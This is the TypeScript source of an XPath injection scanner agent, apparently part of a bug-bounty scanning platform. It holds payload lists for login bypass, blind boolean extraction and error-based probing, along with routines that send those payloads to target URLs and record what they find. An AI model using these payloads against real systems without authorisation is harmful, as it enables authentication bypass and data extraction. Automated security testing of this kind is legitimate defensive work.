/**
 * XPath Injection Agent
 * Based on PayloadsAllTheThings/XPath Injection
 * 
 * Detects and exploits XPath injection vulnerabilities:
 * - Authentication bypass
 * - Data extraction
 * - Blind XPath injection
 * - Error-based extraction
 * - Out-of-band extraction
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface XPathJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testAuthBypass?: boolean;
    testBlind?: boolean;
    extractData?: boolean;
  };
}

// XPath Injection Payloads
const XPATH_PAYLOADS = {
  // Authentication bypass
  authBypass: [
    "' or '1'='1",
    "' or ''='",
    "x' or 1=1 or 'x'='y",
    "'] | //*[contains(name(),'",
    "' or count(/*)=1 or 'a'='b",
    "1' or '1'='1",
    "admin' or '1'='1",
    "' or 1=1]%00",
    "' or 1=1 or ''='",
    "x]|//*|x[x",
  ],

  // Data extraction
  extraction: [
    "'] | //user/*[contains(name(),'",
    "' or //*[1]='",
    "1' and count(/*)=1 and '1'='1",
    "' or substring(name(/*[1]),1,1)='a",
    "' or string-length(name(/*[1]))>0 or '1'='1",
  ],

  // Blind injection (boolean-based)
  blindBoolean: [
    "' and '1'='1",  // True
    "' and '1'='2",  // False
    "' and substring(//user[1]/password,1,1)='a",
    "' and string-length(//user[1]/password)>0 and '1'='1",
  ],

  // Error-based
  errorBased: [
    "' and 1=1/0 and '1'='1",
    "' and count(/x)=0 and '1'='1",
    "' or name(/*)='",
  ],

  // Node extraction
  nodeExtraction: [
    "'] | //* | ['",
    "' or //*[1] or '1'='1",
    "' or name(/*)='root' or '1'='1",
    "' or //user[1]/text()='admin' or '1'='1",
  ],

  // Special characters
  specialChars: [
    "'",
    '"',
    ']',
    '[',
    '|',
    '/',
    '//',
    '*',
    '@',
  ],
};

export class XPathInjectionAgent extends BaseAgent<XPathJob> {
  constructor() {
    super('xpathinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify XPath endpoints', metadata: {} },
      { name: 'Test authentication bypass', metadata: {} },
      { name: 'Test blind injection', metadata: {} },
      { name: 'Attempt data extraction', metadata: {} },
      { name: 'Test error-based injection', metadata: {} },
    ];
  }

  async process(job: Job<XPathJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting XPath injection testing');

    for (const url of urls) {
      try {
        // Test authentication bypass
        if (options.testAuthBypass !== false) {
          const authFindings = await this.testAuthBypass(url);
          findings.push(...authFindings);
        }

        // Test blind injection
        if (options.testBlind !== false) {
          const blindFindings = await this.testBlindInjection(url);
          findings.push(...blindFindings);
        }

        // Test data extraction
        if (options.extractData) {
          const extractFindings = await this.testDataExtraction(url);
          findings.push(...extractFindings);
        }

        // Test error-based
        const errorFindings = await this.testErrorBased(url);
        findings.push(...errorFindings);
      } catch (error) {
        logger.error({ error, url }, 'Error testing XPath injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testAuthBypass(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of XPATH_PAYLOADS.authBypass) {
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `username=${encodeURIComponent(payload)}&password=${encodeURIComponent(payload)}`,
        });

        const body = await response.text();

        // Check for successful auth
        if (this.isAuthSuccess(response, body)) {
          findings.push({
            type: 'xpath-auth-bypass',
            url,
            payload,
            severity: 'critical',
            evidence: 'Authentication bypassed via XPath injection',
            impact: 'Complete authentication bypass',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testBlindInjection(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      try {
        // True condition
        const truePayload = XPATH_PAYLOADS.blindBoolean[0];
        const trueUrl = new URL(url);
        trueUrl.searchParams.set(param, value + truePayload);
        const trueResponse = await fetch(trueUrl.toString());
        const trueBody = await trueResponse.text();

        // False condition
        const falsePayload = XPATH_PAYLOADS.blindBoolean[1];
        const falseUrl = new URL(url);
        falseUrl.searchParams.set(param, value + falsePayload);
        const falseResponse = await fetch(falseUrl.toString());
        const falseBody = await falseResponse.text();

        // Compare responses
        if (trueBody.length !== falseBody.length || trueResponse.status !== falseResponse.status) {
          findings.push({
            type: 'xpath-blind-injection',
            url,
            parameter: param,
            severity: 'high',
            evidence: 'Different responses for true/false XPath conditions',
            technique: 'boolean-based blind',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testDataExtraction(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of XPATH_PAYLOADS.extraction) {
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `query=${encodeURIComponent(payload)}`,
        });

        const body = await response.text();

        // Check for data leakage
        if (this.containsSensitiveData(body)) {
          findings.push({
            type: 'xpath-data-extraction',
            url,
            payload,
            severity: 'high',
            evidence: 'Sensitive data extracted via XPath injection',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testErrorBased(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      for (const payload of XPATH_PAYLOADS.errorBased) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + payload);
          const response = await fetch(testUrl.toString());
          const body = await response.text();

          // Check for XPath errors
          if (this.hasXPathError(body)) {
            findings.push({
              type: 'xpath-error-based',
              url,
              parameter: param,
              payload,
              severity: 'high',
              evidence: 'XPath error message in response',
              technique: 'error-based',
            });
            break;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private isAuthSuccess(response: Response, body: string): boolean {
    return response.status === 200 && (
      body.includes('welcome') ||
      body.includes('dashboard') ||
      body.includes('logout') ||
      body.includes('profile')
    );
  }

  private containsSensitiveData(body: string): boolean {
    const patterns = [
      /password/i,
      /secret/i,
      /api[_-]?key/i,
      /token/i,
      /credit/i,
      /ssn/i,
    ];
    return patterns.some(p => p.test(body));
  }

  private hasXPathError(body: string): boolean {
    const errorPatterns = [
      'xpath',
      'XPathException',
      'XPathEvaluator',
      'Invalid expression',
      'xmlXPathEval',
      'SimpleXMLElement',
      'DOMXPath',
      'XPath error',
    ];
    return errorPatterns.some(p => body.toLowerCase().includes(p.toLowerCase()));
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store XPath finding');
    }
  }
}

export default new XPathInjectionAgent();
